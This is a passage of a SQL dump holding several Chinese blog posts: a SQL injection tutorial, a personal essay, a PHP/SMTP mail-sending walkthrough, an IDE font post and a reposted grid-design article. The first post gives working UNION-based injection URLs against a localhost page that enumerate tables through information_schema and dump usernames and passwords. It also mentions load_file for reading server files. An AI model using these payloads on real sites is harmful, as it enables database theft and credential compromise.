(59, '稍微高级一点的SQL注入', 'sqlinjection-again', 4, '<p>正如之前paperen的 <a href="http://iamlze.cn/archive/did-you-handle-the-datas" target="_blank">你是这样处理来自$_GET的数据吗</a> 里面说的，还有很久之前的 <a href="http://iamlze.cn/archive/sql-inject/" target="_blank">小心sql注入漏洞</a> ，都是涉及到SQL注入的一些东西，其实您如果对SQL注入有兴趣的话不妨点击paperen友情链接中的习科论坛去那看看，里面很多帖子都是有关入侵的，而paperen在这个组织不知不觉间也都快4年了。废话也就不多说了，直接入话题。</p><p>还记得在“你是这样处理来自$_GET的数据吗 ”里面写到的那个SQL，</p><pre>$sql = ''select * from goods where id=''.$id;</pre><p>不对传入来的数据进行任何过滤甚至不用单引号抱起来会导致的问题在那篇文章中已经说的比较明确了，如果您能猜到数据库其他表的话还能查到其他表的内容，而这次paperen想说一些使用这个漏洞更高级的一个技巧。</p><!--more--><p>假如你已经证实了此处存在漏洞，(怎样证明？简单来说分别测试一下将参数改为id=1=1与id=1=2再看页面就能知道是否存在漏洞，如果显示信息不一样或出错则证明存在漏洞)，但是即使证实了有漏洞但猜不到其他表的表名怎办。使用一个很邪恶的招数，先放出注入URL。</p><p>爆出目前数据库名</p><pre>URL:http://localhost/mytest/sqlinject/?id=-1+UNION+select+1,2,3,database(),5,6,7,8,9+from+information_schema.columns<br />SQL:SELECT * FROM goods WHERE id=-1 UNION SELECT 1,2,3,DATABASE(),5,6,7,8,9 FROM information_schema.columns<br /></pre><p><a href="http://localhost/paperenblog/file/110" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/110" alt="20101209211926" title="上传于2010-12-09"></a></p><p>然后将获得数据库test的hex值后再爆出该test数据库中的表名(获得test的hex值 select hex(''test'') 放到mysql中跑一下就可以看到结果了，74657374前面再加上0x，十六进制数)</p><pre>URL:http://localhost/mytest/sqlinject/?id=-1+UNION+SELECT+1,2,3,GROUP_CONCAT(DISTINCT(table_name)),5,6,7,8,9+FROM+information_schema.columns+AS+c+WHERE+c.table_schema=0x74657374<br />SQL:SELECT * FROM test.goods WHERE id = -1 UNION SELECT 1 , 2, 3, GROUP_CONCAT( DISTINCT table_name ) , 5, 6, 7, 8, 9 FROM information_schema.columns AS c WHERE c.table_schema = 0x74657374<br /></pre><p><a href="http://localhost/paperenblog/file/111" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/111" alt="20101210084954" title="上传于2010-12-10"></a></p><p>然后在将表user的hex值放入去，查user表的字段，现在是DISTINCT(column_name)了，最好加上and如果有不止一个数据库有user表的话可能得出的结果会误导你。</p><pre>URL:http://localhost/mytest/sqlinject/?id=-1+UNION+SELECT+1,2,3,GROUP_CONCAT(DISTINCT(column_name)),5,6,7,8,9+FROM+information_schema.columns+WHERE+table_name=0x75736572+AND+TABLE_SCHEMA=0x74657374<br />SQL:select * from goods where id=-1 UNION SELECT 1,2,3,GROUP_CONCAT(DISTINCT(column_name)),5,6,7,8,9 FROM information_schema.columns WHERE table_name=0x75736572 AND TABLE_SCHEMA=0x74657374<br /></pre><p><a href="http://localhost/paperenblog/file/112" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/112" alt="20101210095933" title="上传于2010-12-10"></a><br /></p><p>you see！已经一步步地获得了我们想要的信息了，是不是有点意思呢？所以paperen说这种东西搞上来会上瘾的。</p><p>然后直接爆出他的user表的明码。</p><pre>URL:http://localhost/mytest/sqlinject/?id=-1+UNION+SELECT+1,password,3,username,5,6,7,8,9+FROM+user<br />SQL:select * from goods where id=-1 UNION SELECT 1,password,3,username,5,6,7,8,9 FROM user<br /></pre><p><a href="http://localhost/paperenblog/file/113" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/113" alt="20101210100806" title="上传于2010-12-10"></a></p><p>但是user表里面可能不止一个用户数据，那么就加上limit吧</p><pre>URL:http://localhost/mytest/sqlinject/?id=-1+UNION+SELECT+1,password,3,username,5,6,7,8,9+FROM+user+limit+1,1<br />SQL:select * from goods where id=-1 UNION SELECT 1,password,3,username,5,6,7,8,9 FROM user limit 1,1<br /></pre><p>然后将获得的密码拿去破解获得明码，再知道后台路径，使用用户帐号与破解的密码登陆到后台吧，但是paperen后面两个步骤也是看你人品的，如果密码被搞得比较复杂，你也很难破解，即使你破解了也得要找到后台地址。So……就到此为止了。就是娱乐一下。（PS：你还可以用load_file将服务器一些文件内容弄到，前提是你也要猜到文件的路径）</p><p>要了解更多？</p><p>关于INFORMATION_SCHEMA <a href="http://dev.mysql.com/doc/refman/5.1/zh/information-schema.html" target="_blank">http://dev.mysql.com/doc/refman/5.1/zh/information-schema.html</a></p><p>关于更多入侵不妨也可以去习科看看，这个也是一个例子 <a href="http://bbs.blackbap.org/redirect.php?tid=1876" target="_blank">http://bbs.blackbap.org/redirect.php?tid=1876</a></p><p>对于网站开发人员来说sql或者是一个恶梦，但是很明显这种是从低级错误引发的，没有对参数进行过滤导致了这种可怕的结果。怎样去防止出现这种漏洞应该是程序员与开发者要去想清楚的。<br /></p></p>', 2, 1, 581, 0, 0, 0, 1291947876, 0),
(60, '多少', 'howmuch', 1, '<p>“用多少天用多少年的跌跌撞撞才找到終點”，越成長就越喜歡陳奕迅的歌，發覺每首歌都好好聽。沖涼時唱一個，等公交時哼一段，睡覺前聽一首~~</p><p>不知道不覺得又一年了，時間就是這麼快，畢業已經半年了，還是不時地想念宿舍的弟兄們，paperen想他們大概也變了，跟大學的朋友交流也越來越少了，偶爾在綫上聊幾句，一開始還有給部分人發短信報告一下自己的生活，電話一開始也有打過，但是漸漸的就少了，paperen不知道能不能用越來越陌生來形容，但是在paperen認為不至於陌生，因為再碰到他們的時候可能不如大學的那樣青春了那樣單純了，但是在paperen腦中他們還是我在大學認識的他們，而paperen還是他們在大學認識的paperen……</p><p>冬至到底是什麼一個節日，聖誕節，元旦，paperen對節日沒什麼感覺，只對放假敏感…聖誕節夜晚的街上應該挺美的，假的聖誕樹，繽紛的燈泡，但對於paperen來說也就是一轉眼過去的東西。晚上回蝸搭的差不多都是末班車，一直喜歡坐在最後的位置，靠著窗，有時後會對著車窗發呆有時候會在做手指操…而看著外面不斷後退的街道與途人，還是能清晰地告訴我“這裡是深圳，這個是繁華的城市”。</p><!--more--><p>看到過有著華麗外表的住宅樓，看到過連牌子名字都說不出來的名車，但也不時看到街上撿垃圾的乞丐，在車上經常遇到一身泥土的農民工…大城市就是能看到如此極端的生活方式，看上去所有人都是活的踏踏實實的。我們貌似從來不會問社會對自己的待遇到底公不公平，但站在高處的他們應該總是看不起站在低處的他們吧，但paperen從來就沒有鄙視過農民工這種處於社會底層的勞動人們，如果沒有他們的勞動也就是沒有今天城市的一切~any way，我是一個知足的人，或者大家都是，也或者公平並不是我們想要的。</p><p>“用多少天用多少年的跌跌撞撞才找到終點”，終點這個詞其實是很模糊的，paperen說不出什麼才叫終點，但paperen正因為這種模糊才覺得有味道。</p><p>paperen漸漸喜歡上用繁體字，雖然不會寫…但是看著確實挺好看的，特別是14px的。</p><p>這個是《多少》的視頻，不想看的就不要點了… <a href="http://v.youku.com/v_show/id_XMTI4ODQ5NTI0.html" target="_blank">http://v.youku.com/v_show/id_XMTI4ODQ5NTI0.html</a></p></p>', 2, 1, 571, 0, 0, 0, 1293065771, 0);
INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(61, '关于smtp发送邮件一些东东', 'mail-via-php', 2, '<p>最近paperen公司的那个搞了一年的东西也差不多可以拿出来了，至少在数据上可靠了点，界面上就……程序上就更……关于丢失密码的处理会有涉及到给会员的注册邮箱发送邮件功能，其实就是运用了SMTP这个服务。</p><p>正如对PHP函数有了解的人都应该知道PHP中有一个mail函数，直接调用它理论上就可以发送邮件了</p><div class="methodsynopsis dc-description"><span class="type">bool</span> <span class="methodname"><strong>mail</span> ( <span class="methodparam"><span class="type">string</span> <tt class="parameter">$to</tt></span> , <span class="methodparam"><span class="type">string</span> <tt class="parameter">$subject</tt></span> , <span class="methodparam"><span class="type">string</span> <tt class="parameter">$message</tt></span> [, <span class="methodparam"><span class="type">string</span> <tt class="parameter">$additional_headers</tt></span> [, <span class="methodparam"><span class="type">string</span> <tt class="parameter">$additional_parameters</strong></tt> \r\n]] )</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">你能从手册中获得更多例子，这个函数确实是太方便了，以至于paperen一开始也会对它感到神奇，因为实在是搞不清为什么一个函数就能发送一封邮件，直观上看来貌似这个函数能直接跟邮局联系。但实质上它要起作用需要服务器的支持，简单来说你的服务器需要有SMTP 服务。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">很幸运公司的服务器有这个服务，但也很不幸运直接调用mail函数来发邮件的结果并不能让自己满意。当然paperen也找了不少网上提供的发送邮件代码，结果都不是很满意的，有些邮箱能收到有些邮箱收不到，而且绝大部分都是一些主流的邮箱，例如163，126等</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">所以paperen觉得还是有必要自己搞清楚一下这个原理，其实真的没那么神秘。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">或者你开始你需要对smtp有一个基本的了解，paperen貌似以前大学的时候就学过这个，但书上学得确实没有实践中学的劲。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">或者你可以看看以下链接的内容</div><div class="methodsynopsis dc-description"><a href="http://baike.baidu.com/view/5450.htm" target="_blank">http://baike.baidu.com/view/5450.htm</a></div><div class="methodsynopsis dc-description"><a href="http://www.cnblogs.com/scottckt/archive/2007/07/17/820591.html" target="_blank">http://www.cnblogs.com/scottckt/archive/2007/07/17/820591.html</a></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">然后动动手试试在"黑屏"下发一封邮件玩玩。下图为telent localhost 25后的界面，可以使用help参数查看命令。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description"><a href="http://localhost/paperenblog/file/114" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/114" alt="20110113210420" title="上传于2011-01-13"></a></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">如果有一台服务器而且有smtp服务的话不妨可以试试，paperen公司里面就有一台对外的服务器可以玩，oy~~不过如果没有服务器也不要紧，你可以使用第三方的smtp服务的，参见下面的例子（使用163的）<br /></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">在cmd下输入 telnet smtp.163.com 25</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description"><a href="http://localhost/paperenblog/file/115" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/115" alt="20110113210644" title="上传于2011-01-13"></a></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">就能登陆到163的smtp服务了，不过首先要使用helo命令打个招呼先</div><div class="methodsynopsis dc-description"><br /></div><pre>220 163.com Anti-spam GT for Coremail System (163com[20101010])<br />helo paperen<br />250 OK<br />auth login<br />334 dXNlcm5hbWU6<br />//你帐号的base64码<br />334 UGFzc3dvcmQ6<br />//你帐号密码的base64码<br />235 Authentication successful<br />mail from:<paperen@163.com><br />250 Mail OK<br />rcpt to:<paperen@gmail.com><br />250 Mail OK<br />data<br />354 End data with <CR><LF>.<CR><LF><br />mime-version:1.0<br />from:paperen<paperen@163.com><br />to:paperen<paperen@gmail.com><br />subject:test<br />content-type:text/html; charset="utf-8"<br />//这里要空两行,1行<br />//2行<br />hello world!<br />.<br />250 Mail OK queued as smtp4,DtGowLCbrgVa+y5N1C9xAA--.11142S2 1294924769<br /></pre><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description"><a href="http://localhost/paperenblog/file/116" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/116" alt="20110113212115" title="上传于2011-01-13"></a></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">其中334两行分别要填写您在163的帐号与密码，而且要用base64码，这个也很容易嘛，可以用php中的base64_encode函数帮你或者用在线工具 <a href="http://tool.114la.com/base64.html" tartget="_blank">http://tool.114la.com/base64.html</a> &nbsp;复制后在黑屏里面右击粘贴就可以了，也不用自己照着输入。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">后面其实也就没什么了，mail from你懂的，rcpt to也就是要发给谁。不过要注意一下在data后，也就是在写邮件内容前空两行。然后到gmail看看吧。<br /></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description"><a href="http://localhost/paperenblog/file/117" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/117" alt="20110114091637" title="上传于2011-01-14"></a></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">这就使用命令行模式下成功发送了一封邮件了，这就是发送邮件的原理。Of course~光来点英文的信件也没神马意思，我们就是喜欢玩花样的，或者你觉得"发中文内容还不容易嘛，也是拷贝的功夫"，在黑屏下的确不支持中文输入法的，没错也得用拷贝的方法将中文弄到邮件内容里面去，但别高兴得太早，如果你以为就这么简单那么你就错了，结果发送过来的邮件就是一堆乱码"�����ļ�������ϸ����"，N个口……问你死未……</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">其实发中文的关键也在于要对内容进行一下base64加密，并在邮件头加上一个声明</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">Content-Transfer-Encoding: base64</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">那么发送的内容就ok了，不过至于邮件的标题嘛，详见下面，因为标题处有些少复杂，需要加上一些字符来标识。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">所谓懒惰是动力是对的，想象一下如果我们都是在命令行下发送邮件的话……发一封邮件少则需要15分钟，多则半个小时……这真的让人崩溃了，就连paperen自己面对着这个黑屏状态敲着无数遍重复的命令也快要崩溃了（还不能输错，paperen不知道如何删除之前的输入……只能覆盖而且覆盖后的命令会乱码的，你试试看就明白），就写一个程序让它帮我们发送邮件好了。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">下面开始来更爽的，就是搞一个发邮件的php程序。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">或者在开始之前你需要了解关于socket的知识 &nbsp;<a href="http://baike.baidu.com/view/13870.htm" target="_blank">http://baike.baidu.com/view/13870.htm</a></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">简单来说socket就是ip+端口号的意思，你需要跟其他机子交流你需要链接到正确的端口号上并且该端口号应该有进程在接收与处理数据，或者大概就是这个意思吧~~而正如在命令行下操作发送邮件，我们首先要做的就是要连上smtp服务器，然后再输送命令与数据，所以我们第一步是要连接到服务器smtp服务监听的端口上，163的就是25。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">php内置关于socket操作的函数也够全面的了，自己可以在手册中输入socket看看。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">对于连上163的smtp，首先使用的是fsockopen（<span class="dc-title">Open Internet or Unix domain socket connection</span>）打开一个socket连接，fsockopen返回的是一个资源类型的数据，换言之可以使用fgets来获取在socket上传输的数据。</div><div class="methodsynopsis dc-description"><br /></div><pre>$smtp_server = ''smtp.163.com'';<br />$smtp_port = ''25'';<br />$fp = fsockopen( $smtp_server , $smtp_port );<br />echo fgets( $fp );<div class="methodsynopsis dc-description">//220 163.com Anti-spam GT for Coremail System (163com[20101010])<br />fclose( $fp );<br /></div><div class="methodsynopsis dc-description"><br /></pre><div class="methodsynopsis dc-description">既然可以这样搞，故下面的代码就明了，注意的是可能需要判断一下服务端返回的状态，是否错误，是否可以继续。不过在这个例子中paperen就不写这么严谨了，毕竟最后会分享一个摘自uchome的利用socket发送邮件的函数。</div><pre><br /><div class="methodsynopsis dc-description">$username = ''***'';//您邮箱的帐号，@前面的<br />$password = ''***'';//密码<br /><br />$from = ''paperen@163.com'';//寄信人邮箱<br />$to = ''paperen@gmail.com'';//收件人邮箱<br />$smtp_server = ''smtp.163.com'';//smtp服务器<br />$smtp_port = ''25'';//端口<br />$message = "Hello paperen,i use php send a mail to you,very cool yet?";//邮件内容<br />$subject = "Test Only";//邮件标题<br /><br />set_time_limit(0);<br /><br />$fp = fsockopen( $smtp_server , $smtp_port );<br />if( substr( fgets( $fp ), 0, 3 ) != ''220'' ) exit(''connect error'');<br /><br />//hello<br />fputs($fp, "helo 163\\r\\n");<br />if( substr( fgets( $fp ), 0, 3 ) != ''250'' ) exit(''helo error'');<br /><br />//auth login<br />fputs($fp, "auth login\\r\\n");<br />if( substr( fgets( $fp ), 0, 3 ) != ''334'' ) exit(''user error'');<br />fputs($fp, base64_encode( $username ) . "\\r\\n" );<br />if( substr( fgets( $fp ), 0, 3 ) != ''334'' ) exit(''pwd error'');<br />fputs($fp, base64_encode( $password ) . "\\r\\n" );<br /><br />//auth success<br />if( substr( fgets( $fp ), 0, 3 ) != ''235'' ) exit(''auth failed'');<br /><br />//mail from<br />fputs($fp, "mail from:&lt;{$from}&gt;\\r\\n" );<br />if( substr( fgets( $fp ), 0, 3 ) != ''250'' ) exit(''mail from error'');<br /><br />//rcpt to<br />fputs($fp, "rcpt to:&lt;{$to}&gt;\\r\\n" );<br />if( substr( fgets( $fp ), 0, 3 ) != ''250'' ) exit(''rcpt to error'');<br /><br />//data<br />fputs($fp, "data\\r\\n" );<br />if( substr( fgets( $fp ), 0, 3 ) != ''354'' ) exit(''data error'');<br /><br />//header<br />$headers = "mime-version: 1.0\\r\\n";<br />$headers .= "from: paperen&lt;{$from}&gt;\\r\\n";<br />$headers .= "to: paperen&lt;{$to}&gt;\\r\\n";<br />$headers .= "subject: {$subject}\\r\\n";<br />$headers .= "content-type: text/html; charset=utf-8\\r\\n";<br /><br />fputs($fp, "{$headers}\\r\\n\\r\\n" );<br />fputs($fp, "$message\\r\\n");<br />fputs($fp, ".\\r\\n");<br /><br />if( substr( fgets( $fp ), 0, 3 ) != ''250'' ) exit(''sendmail failed'');<br />echo ''OK'';<br /><br />fclose( $fp );<br /></pre><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description"><a href="http://localhost/paperenblog/file/118" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/118" alt="20110114205835" title="上传于2011-01-14"></a></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">就是这么简单就可以用php帮你搞掂，是不是很cool~</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">下面附带自己在uchome摘出来的一个sendmail函数，具体配置需要自己根据自己需求修改才可以发送，paperen测试过gmail，163，126，sina，hotmail，qq均可以收到邮件。</div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">关于中文标题与内容乱码的问题自己参照sendmail这个函数中看吧，看完你就明白了，主要是43行到53行的代码要看看。</div><div class="methodsynopsis dc-description"><br /></div><pre>$email_subject = ''=?'' . $mail[''charset''] . ''?B?''.base64_encode(preg_replace("/[\\r|\\n]/", '''', ''[''.$mail[''sitename''].''] ''.$subject)).''?='';<br />$email_message = chunk_split(base64_encode(str_replace("\\n", "\\r\\n", str_replace("\\r", "\\n", str_replace("\\r\\n", "\\n", str_replace("\\n\\r", "\\r", $message))))));<br /><br />$headers = "From: $email_from{$maildelimiter}X-Priority: 3{$maildelimiter}X-Mailer: ". $mail[''sitename''] ."{$maildelimiter}MIME-Version: 1.0{$maildelimiter}Content-type: text/html; charset=" . $mail[''charset''] . "{$maildelimiter}Content-Transfer-Encoding: base64{$maildelimiter}";<br /></pre><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">下载地址 <a href="http://iamlze.cn/demo/mail/sendmail_uchome.rar" target="_blank">这里</a></div><div class="methodsynopsis dc-description"><br /></div><div class="methodsynopsis dc-description">呼·~~好不容易才写完一篇，希望对使用php发送邮件或者想玩玩底层发邮件的你有点帮助吧</div></p><!--more-->', 2, 1, 688, 0, 0, 0, 1295069874, 0),
(63, 'IDE中你最喜爱的字体是哪个', 'font-of-IDE', 4, '<p>理论上说这是一篇提高我们写代码时的幸福感的文章，you know~paperen也对这个捣腾了许久，好的IDE是会让你写起代码来更加顺手，而当你找到了你喜爱的IDE后是否有想过将代码的字体也改得更好看更舒服一点，那敲起代码来就更舒服了，对眼睛也更好一点，you know有一句话是没错的“代码如诗”……</p><p>当然啦，这个话题是无关任何语言平台的，关乎的只是代码的外表美，嗯~确实比较肤浅……you see，paperen目前习惯使用的IDE是netbean+dreamweaver，前者写php代码后者写css与js，一直都习惯这样做的了，paperen很喜欢netbean但是代码的字体总不是那么好看……相对于dreamweaver而言，在dreamweaver中如果你的文件编码是utf8的话它默认使用的字体是Courier New的，如果你的编码是gbk/gb2312的话那么默认的字体就是宋体，但是paperen倒是觉得宋体下的英文难看了。</p><p>下面先放出一个paperen测试过程中试用的字体，你可以在里面选择你觉得顺眼的对比对比。paperen目前的首选字体是Courier New 15号的，而dw中也是Courier New 12pt，感觉雅黑怎不太好看呢，有点失望，难道是paperen的雅黑字体是盗版的……</p><!--more--><p><a href="http://iamlze.cn/demo/IDE-font/" target="_blank">http://iamlze.cn/demo/IDE-font/</a></p><p>Dw中utf-8是默认使用Courier New的</p><p><a href="http://localhost/paperenblog/file/119" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/119" alt="20110121084638" title="上传于2011-01-21"></a></p><p>而如果是中文编码的话就是宋体</p><p><a href="http://localhost/paperenblog/file/120" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/120" alt="20110121084749" title="上传于2011-01-21"></a></p><p>但当然你可以按下ctrl+U对字体进行设置，不用宋体</p><p><a href="http://localhost/paperenblog/file/121" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/121" alt="20110121085032" title="上传于2011-01-21"></a></p><p>而对于netbean下的字体调整在“工具”中的“选项”，字体设置中会有</p><p><a href="http://localhost/paperenblog/file/122" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/122" alt="20110121085250" title="上传于2011-01-21"></a></p><p>但将缺省的字体设置为Courier New后中文会变成乱码~</p><p><a href="http://localhost/paperenblog/file/123" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/123" alt="20110121085633" title="上传于2011-01-21"></a></p><p>paperen的解决方法是为字符串与字符的字体加上Monospaced也就是netbean默认的字体，这种字体也可以显示中英文，但是paperen觉得这种字体的英文就是不如Courier New好看，但另一个问题又出现了就是html代码中的中文变成乱码了……而这个设置就需要进一步设置了，针对其他语言的字体设置一下。例如HTML</p><p><a href="http://localhost/paperenblog/file/124" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/124" alt="20110121091659" title="上传于2011-01-21"></a></p><p>对html的文本使用Monospaced就好了，但如果html的中文字符还是乱码的话试试将所有语言的缺省调回Monospaced然后确定然后再次设置缺省为Courier New应该就可以了，如果还是不行自己再捣腾一下看看，实在不行就将缺省设置为Monospaced然后将php或者你所从事的语言代码字体设置为你喜欢的字体，大不了花点时间而已，为了代码看着不那么刺眼也值得。</p></p>', 2, 1, 954, 0, 0, 0, 1295574360, 0),
(64, '[转载] 网页的栅格系统设计', 'grid_systems', 5, '<p>先声明一下，这篇文章转载至TaobaoUED博客，还是一篇很旧的文章，但旧不要紧paperen觉得值得分享所以就转载了。原文url <a href="http://ued.taobao.com/blog/2008/09/17/grid_systems/" target="_blank">http://ued.taobao.com/blog/2008/09/17/grid_systems/</a> &nbsp;或者你还没有了解过栅格这个名词，但不要紧通过这篇文章你就能了解到栅格在web设计上的应用，好文章值得转，好技能值得你拥有，so，paperen决定转载这篇文章，第一次转载（paperen连图片也截下来了）。</p><p><a href="http://localhost/paperenblog/file/125" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/125" alt="20110125094921" title="上传于2011-01-25"></a></p><p>栅格系统的形成<br /></p><!--more-->1692年，新登基的法国国王路易十四感到法国的印刷水平强差人意，因此命令成立一个管理印刷的皇家特别委员会。他们的首要任务是设计出科学的、合理的， 重视功能性的新字体。委员会由数学家尼古拉斯加宗（Nicolas Jaugeon）担任领导，他们以罗马体为基础，采用方格为设计依据，每个字体方格分为64个基本方各单位，每个方各单位再分成36个小格，这样，一个印 刷版面就有 2304个小格组成，在这个严谨的几何网格网络中设计字体的形状，版面的编排，试验传达功能的效能，这是是世界上最早对字体和版面进行科学实验的活动，也 是栅格系统最早的雏形。<br /><br />栅格系统英文为“grid systems”，也有人翻译为“网格系统”，其实是一回事。不过从定义上说，栅格更为准确些，从维基百科查到栅格的定义为：<a href="http://zh.wikipedia.org/w/index.php?title=%E6%A0%85%E6%A0%BC%E8%AE%BE%E8%AE%A1&amp;variant=zh-cn" target="_blank">栅格设计系统（又称网格设计系统、标准尺寸系统、程序版面设计、瑞士平面设计风格、国际主义平面设计风格），是一种平面设计的方法与风格。运用固定的格子设计版面布局，其风格工整简洁，在二战后大受欢迎，已成为今日出版物设计的主流风格之一</a>。<br /><br />网页设计中的栅格系统 <br />我给网页栅格系统下的定义为：以规则的网格阵列来指导和规范网页中的版面布局以及信息分布。<br /><p>网页栅格系统是从平面栅格系统中发展而来。对于网页设计来说，栅格系统的使用，不仅可以让网页的信息呈现更加美观易读，更具可用性。而且，对于前端开发来说，网页将更加的灵活与规范。</p><p><a href="http://localhost/paperenblog/file/126" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/126" alt="20110125095001" title="上传于2011-01-25"></a></p><p><a href="http://localhost/paperenblog/file/127" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/127" alt="20110125095039" title="上传于2011-01-25"></a></p><p>栅格系统在现在的网页设计中应用越来越多，从网络上搜罗了一篇关于栅格系统应用的文章：<a href="http://article.yeeyan.org/view/snlchina/3570" target="_blank">30个最顶尖的基于栅格系统的博客网站设计</a>。<br /><br />栅格系统的设计原理及应用<br />那么如何设计一个栅格系统？接下来我们将通过实例，详细的介绍一下网页栅格系统的原理与应用：<br /></p><p><a href="http://localhost/paperenblog/file/128" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/128" alt="20110125095110" title="上传于2011-01-25"></a></p><p>在网页设计中，我们把宽度为“W”的页面分割成n个网格单元“a”，每个单元与单元之间的间隙设为“i”,此时我们把“a+i”定义“A”。他们之间的关系如下：<br />W =（a×n）+（n-1）i<br />由于a+i=A，<br />可得：(A×n) – i = W<br />这个公式表述了网页的布局与网页“背后”的栅格系统之间的某种关系。我们拿yahoo作例，来看一下栅格系统的应用：<br /></p><p><a href="http://localhost/paperenblog/file/129" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/129" alt="20110125095140" title="上传于2011-01-25"></a></p><p>yahoo的网站页面宽度为W=950px，每个区块与区块的间隔为i=10px；如果应用上面的公式，可以推出A=40px，既yahoo首页横向版式设计采用的栅格系统为：<br />（40×n）- 10 = W<br />下面我们列出当n等于不同数值时W变化的数值表格 ：<br /></p><p><a href="http://localhost/paperenblog/file/130" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/130" alt="20110125095205" title="上传于2011-01-25"></a></p><p>从表格可以看出：yahoo首页的布局完全是按照栅格系统进行设计的，每个区块的宽度对应的n值分别为：4，11，9。在这里我们看到一个很有意思 的事情：只要保证一个横向维度的各个区块的n值相加等于24，则即可保证页面的宽度一定是950px。然而，950px的宽度也恰好就是当n=24的时 候，W的宽度值。由此我们得出以下的应用模式：</p><p><a href="http://localhost/paperenblog/file/131" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/131" alt="20110125095245" title="上传于2011-01-25"></a></p><p>在栅格系统中，设计师根据需要制定不同的版式或者划分区块，他们的依据将是上面的那张对应表进行设计。这样，一个栅格系统的应用就从此开始了。我们 看到，使用栅格系统的网页设计，非常的有条理性；看上去也很舒服。最重要的是，它给整个网站的页面结构定义了一个标准。对于视觉设计师来说，他们不用再为 设计一个网站每个页面都要想一个宽度或高度而烦恼了。对于前端开发工程师来说，页面的布局设计将完全是规范的和可重用的，这将大大节约了开发成本。对于内 容编辑或广告销售来说，所有的广告都是规则的，通用的，他们再也不用做出一套N张不同尺寸的广告图了……<br /><br />当然只要你愿意，我们可以衍生出任何一种栅格系统，只要改变A和i的值，这个根据网站的实际情况来制定。那么如何选择合适栅格系统，主要通过“构成 要素与程序、限制与选择、构成要素的比例、组合、虚空间与组合、四边联系与轴的联系、三的法则、圆与构成、水平构成这些设计元素规划，来实现比例和谐的平 面设计”。比较深奥，我们在这里就不详细阐述了。<br /><br />呵呵，说了一堆栅格系统的优点。大家可能会问：难道栅格系统真的是完美的么？答案是否定的：对于内容信息不确定导致高度不确定的页面，在高度层面上就无法做到栅格了。当然，具体的情况还需具体的分析与解决，这就需要设计师们在实际的应用中不断的总结经验，不断实践了。<br /></p><p>原文 <a href="http://ued.taobao.com/blog/2008/09/17/grid_systems/" target="_blank">http://ued.taobao.com/blog/2008/09/17/grid_systems/</a></p></p>', 2, 1, 660, 0, 0, 0, 1295922124, 0),
